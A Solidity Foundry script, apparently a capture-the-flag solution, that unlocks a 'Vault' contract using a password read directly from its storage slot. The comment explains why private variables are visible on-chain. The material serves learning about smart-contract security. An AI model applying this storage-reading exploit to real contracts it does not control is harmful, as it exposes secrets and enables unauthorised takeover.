//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Vault.sol";

/**
 * The goal here is to unlock the vault contract.
 * At first it seems like there is nothing out of the ordinary but when we dive into how contracts handle storage we get more clarity
 * Each contract on ethereum has 2 ^ 256 storage slots, and each slot can hold 32 bytes
 * So our vault contract has a private variable.
 * This variable's data is visible by looking at the storage slot of the password variable.
 *
 * Foundry's cast comes commands to look into a contracts storage slots, and you can find more documentation at foundry.
 */

contract UnlockVault is Script {
    Vault vaultContract = Vault(0x56B67A00692e76f164e2C3dCcc5CE066ee962DCF);
    bytes32 password =
        0x412076657279207374726f6e67207365637265742070617373776f7264203a29;

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(privateKey);
        vaultContract.unlock(password);
        vm.stopBroadcast();
    }
}
